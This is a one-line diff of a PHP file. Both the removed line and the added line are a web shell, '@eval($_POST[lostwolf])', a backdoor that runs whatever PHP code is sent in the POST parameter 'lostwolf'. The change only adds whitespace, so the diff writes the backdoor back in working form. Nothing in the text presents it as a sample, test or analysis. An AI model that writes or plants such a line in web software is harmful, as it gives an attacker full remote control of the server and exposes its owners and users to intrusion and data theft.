@@ -1,1 +1,1 @@
-<?php@eval($_POST[lostwolf])?>
+<?php @eval($_POST[lostwolf]) ?>
